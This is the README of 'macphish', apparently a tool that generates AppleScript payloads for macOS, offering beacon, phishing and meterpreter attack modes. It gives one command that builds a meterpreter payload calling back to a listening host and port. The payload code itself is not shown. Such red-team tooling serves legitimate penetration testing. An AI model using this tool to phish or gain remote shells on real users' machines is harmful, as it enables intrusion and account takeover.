# macphish
Applescript payload generator
![macphish](macphish-alpha.png?raw=true "macphish")

## Usage
There are 4 attack methods available:
* beacon
* phishing
* meterpreter
* meterpreter-grant

Attack methods 'beacon' and 'phishing' can generate Applescript scripts directly, in case you don't want to run them as macros. For meterpreter attacks, only python payloads are supported at the moment. 

The simplest way of generating a meterpreter payload is:
```
$./macphish.py -lh <listening host> -lp <listening port> -a meterpreter 
```
